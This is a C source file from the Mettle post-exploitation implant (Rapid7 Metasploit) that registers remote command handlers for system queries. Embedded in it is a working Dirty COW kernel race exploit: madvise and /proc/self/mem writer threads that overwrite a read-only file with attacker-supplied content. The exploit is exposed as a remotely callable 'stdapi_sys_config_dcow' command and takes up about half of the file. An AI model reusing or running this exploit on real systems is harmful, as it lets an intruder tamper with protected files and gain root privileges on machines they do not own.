/**
 * Copyright 2015 Rapid7
 * @brief System Config API
 * @file config.c
 */

#include <errno.h>
#include <stdlib.h>
#include <unistd.h>

#include <dnet.h>
#include <mettle.h>
#include <sigar.h>
#include <time.h>
#include "log.h"
#include "tlv.h"

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>

#include <sys/types.h>
#include <unistd.h>


static char *normalize_env_var(char *var)
{
	while (*var == '%' || *var == '$') {
		var++;
	}

	char *end = var + strlen(var) - 1;
	while (end > var && *end == '%') {
		end--;
	}

	*(end + 1) = '\0';

	return var;
}

struct tlv_packet *sys_config_getenv(struct tlv_handler_ctx *ctx)
{
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);

	struct tlv_iterator i = {
		.packet = ctx->req,
		.value_type = TLV_TYPE_ENV_VARIABLE,
	};

	char *env_var;
	while ((env_var = tlv_packet_iterate_str(&i))) {
		char *env_val = getenv(normalize_env_var(env_var));
		if (env_val) {
			struct tlv_packet *env = tlv_packet_new(TLV_TYPE_ENV_GROUP, 0);
			env = tlv_packet_add_str(env, TLV_TYPE_ENV_VARIABLE, env_var);
			env = tlv_packet_add_str(env, TLV_TYPE_ENV_VALUE, env_val);
			p = tlv_packet_add_child(p, env);
		}
	}

	return p;
}

struct tlv_packet *sys_config_getuid(struct tlv_handler_ctx *ctx)
{
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);

	return tlv_packet_add_fmt(p, TLV_TYPE_USER_NAME,
			"uid=%d, gid=%d, euid=%d, egid=%d",
			getuid(), geteuid(), getgid(), getegid());
}

struct tlv_packet *sys_config_sysinfo(struct tlv_handler_ctx *ctx)
{
	struct mettle *m = ctx->arg;

	sigar_sys_info_t sys_info;
	if (sigar_sys_info_get(mettle_get_sigar(m), &sys_info) == -1) {
		return tlv_packet_response_result(ctx, errno);
	}

	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);

	p = tlv_packet_add_str(p, TLV_TYPE_COMPUTER_NAME, mettle_get_fqdn(m));
	p = tlv_packet_add_fmt(p, TLV_TYPE_OS_NAME, "%s (%s %s)",
			sys_info.description, sys_info.name, sys_info.version);
	p = tlv_packet_add_str(p, TLV_TYPE_ARCHITECTURE, sys_info.arch);

	return p;
}

/*#define LOGV(...)   0x100000*/
#define LOOP   0x100000
#define TIMEOUT 10

struct mem_arg  {
	void *offset;
	void *patch;
	size_t patch_size;
	const char *fname;
	volatile int stop;
	int success;
};

static void *checkThread(void *arg) {
	struct mem_arg *mem_arg;
	mem_arg = (struct mem_arg *)arg;
	struct stat st;
	int i;
	char * newdata = malloc(mem_arg->patch_size);
	for(i = 0; i < TIMEOUT && !mem_arg->stop; i++) {
		int f=open(mem_arg->fname, O_RDONLY);
		if (f == -1) {
			/*LOGV("could not open %s", mem_arg->fname);*/
			break;
		}
		if (fstat(f,&st) == -1) {
			/*LOGV("could not stat %s", mem_arg->fname);*/
			close(f);
			break;
		}
			/*LOGV("could not stat %s", mem_arg->fname);*/
		if (read(f, newdata, mem_arg->patch_size) == -1) {
			break;;
		}
		close(f);

		int memcmpret = memcmp(newdata, mem_arg->patch, mem_arg->patch_size);
		/*LOGV("ret %d", memcmpret);*/
		if (memcmpret == 0) {
			mem_arg->stop = 1;
			mem_arg->success = 1;
			free(newdata);
			return 0;
		}
		/*LOGV("sleep not stat");*/
		usleep(100 * 1000);
	}
	mem_arg->stop = 1;
	free(newdata);
	return 0;
}
static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;
	int i, c = 0;

	mem_arg = (struct mem_arg *)arg;
	size = mem_arg->patch_size;
	addr = (void *)(mem_arg->offset);

	/*LOGV("[*] madvise = %p %zd", addr, size);*/

	for(i = 0; i < LOOP && !mem_arg->stop; i++) {
		c += madvise(addr, size, MADV_DONTNEED);
	}

	/*LOGV("[*] madvise = %d %d", c, i);*/
	mem_arg->stop = 1;
	return 0;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd, i, c = 0;
	mem_arg = (struct mem_arg *)arg;
	unsigned char *p = mem_arg->patch;
	off_t offset = (off_t)(mem_arg->offset - (void*)0);

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1) {
		/*LOGV("open(\"/proc/self/mem\"");*/
		/*mem_arg->stop = 1;*/
	}

	for (i = 0; i < LOOP && !mem_arg->stop; i++) {
		lseek(fd, offset, SEEK_SET);
		c += write(fd, p, mem_arg->patch_size);
	}

  /*LOGV("[*] /proc/self/mem %d %i", c, i);*/

	close(fd);

	mem_arg->stop = 1;
	return 0;
}

static void exploit(struct mem_arg *mem_arg)
{
	pthread_t pth1, pth2, pth3;

	/*LOGV("[*] currently %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);*/

	mem_arg->stop = 0;
	mem_arg->success = 0;
	pthread_create(&pth3, NULL, checkThread, mem_arg);
	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth3, NULL);
	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);

	/*LOGV("[*] exploited %p=%lx", (void*)mem_arg->offset, *(unsigned long*)mem_arg->offset);*/
}

int rundcow(const char * fromfile, const char * tofile)
{
	/*char * fromfile = argv[1];*/
	/*char * tofile = argv[2];*/
	struct mem_arg mem_arg;
	struct stat st;
	struct stat st2;

	int f=open(tofile,O_RDONLY);
	if (f == -1) {
		/*LOGV("could not open %s", tofile);*/
		return 0;
	}
	if (fstat(f,&st) == -1) {
		/*LOGV("could not open %s", tofile);*/
		close(f);
		return 1;
	}

	int f2=open(fromfile,O_RDONLY);
	if (f2 == -1) {
		/*LOGV("could not open %s", fromfile);*/
		return 2;
	}
	if (fstat(f2,&st2) == -1) {
		/*LOGV("could not open %s", fromfile);*/
		close(f);
		close(f2);
		return 3;
	}

	size_t size = st2.st_size;
	if (st2.st_size != st.st_size) {
		/*LOGV("warning: new file size (%zd) and file old size (%zd) differ\n", st.st_size, st2.st_size);*/
		if (st.st_size < size) {
			close(f);
			close(f2);
			return 4;
		}
	}
		/*size = st2.st_size;*/
	/*}*/
	/*LOGV("size %zd\n\n", size);*/

	mem_arg.patch = malloc(size);
	if (mem_arg.patch == NULL) {
		free(mem_arg.patch);
		close(f);
		close(f2);
		return 5;
	}

	if (read(f2, mem_arg.patch, size) == -1) {
		free(mem_arg.patch);
		close(f);
		close(f2);
		return 6;
	}

	close(f2);

	/*read(f, mem_arg.unpatch, st.st_size);*/

	mem_arg.patch_size = size;
	mem_arg.fname = tofile;

	void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, f, 0);
	if (map == MAP_FAILED) {
		/*LOGV("mmap");*/
		free(mem_arg.patch);
		close(f);
		return 7;
	}

	/*LOGV("[*] mmap %p", map);*/

	mem_arg.offset = map;

	exploit(&mem_arg);
	free(mem_arg.patch);
	close(f);
	// to put back
	/*exploit(&mem_arg, 0);*/

	return mem_arg.success;
}

struct tlv_packet *sys_config_dcow(struct tlv_handler_ctx *ctx)
{
	const char *lib_path = tlv_packet_get_str(ctx->req, TLV_TYPE_LIBRARY_PATH);
	const char *target_path = tlv_packet_get_str(ctx->req, TLV_TYPE_TARGET_PATH);
	int ret = rundcow(lib_path, target_path);
	char * result = 0;
	int vasresult = asprintf(&result, "ncow (%d)", ret);
	if (vasresult == -1) {
		return tlv_packet_response_result(ctx, TLV_RESULT_FAILURE);
	}
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	return tlv_packet_add_str(p, TLV_TYPE_LOCAL_DATETIME, result);
}
	
struct tlv_packet *sys_config_localtime(struct tlv_handler_ctx *ctx)
{
	char dateTime[128] = { 0 };
	time_t t = time(NULL);
	struct tm lt = { 0 };
	localtime_r(&t, &lt);
	strftime(dateTime, sizeof(dateTime) - 1, "%Y-%m-%d %H:%M:%S %Z (UTC%z)", &lt);
	struct tlv_packet *p = tlv_packet_response_result(ctx, TLV_RESULT_SUCCESS);
	return tlv_packet_add_str(p, TLV_TYPE_LOCAL_DATETIME, dateTime);
}

void sys_config_register_handlers(struct mettle *m)
{
	struct tlv_dispatcher *td = mettle_get_tlv_dispatcher(m);

	tlv_dispatcher_add_handler(td, "stdapi_sys_config_getenv", sys_config_getenv, m);
	tlv_dispatcher_add_handler(td, "stdapi_sys_config_getuid", sys_config_getuid, m);
	tlv_dispatcher_add_handler(td, "stdapi_sys_config_sysinfo", sys_config_sysinfo, m);
	tlv_dispatcher_add_handler(td, "stdapi_sys_config_localtime", sys_config_localtime, m);
	tlv_dispatcher_add_handler(td, "stdapi_sys_config_dcow", sys_config_dcow, m);
}
